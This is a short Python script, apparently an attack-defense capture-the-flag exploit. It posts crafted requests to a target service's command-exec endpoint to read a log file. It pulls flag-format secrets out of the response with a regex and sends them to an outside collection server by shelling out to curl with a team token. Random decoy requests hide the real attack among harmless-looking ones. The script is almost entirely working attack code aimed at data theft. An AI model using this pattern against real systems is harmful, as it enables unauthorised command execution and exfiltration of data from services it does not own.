import requests
import sys
import os
import re
import random
ip = sys.argv[1]

with requests.session() as sess:
    order = random.randint(1,20)
    for i in range(0,20):
        if i == order:
            res = requests.post(f"http://{ip}:8001/api/v1/command/exec", json={
  "token": "string",
  "conn_data": {"addr": 'trembolone', "filename": "leakage_log.log"}
})          
            print(res.text)
            data = re.findall(r"[A-Z0-9]{31}=", res.text)
            print(str(data))


            stdout = os.popen(f"""curl -s -H 'X-Team-Token: fd0d0f0d5f004d66' -X PUT -d '{str(data).replace("'", '"')}' http://10.66.66.2/flags""")
            print(stdout.read())
        else:
            requests.post(f"http://{ip}:8001/api/v1/command/exec", json={
  "token": "string",
  "conn_data": {"addr": 'nyc_office', "filename": "leakage_log.log"}
})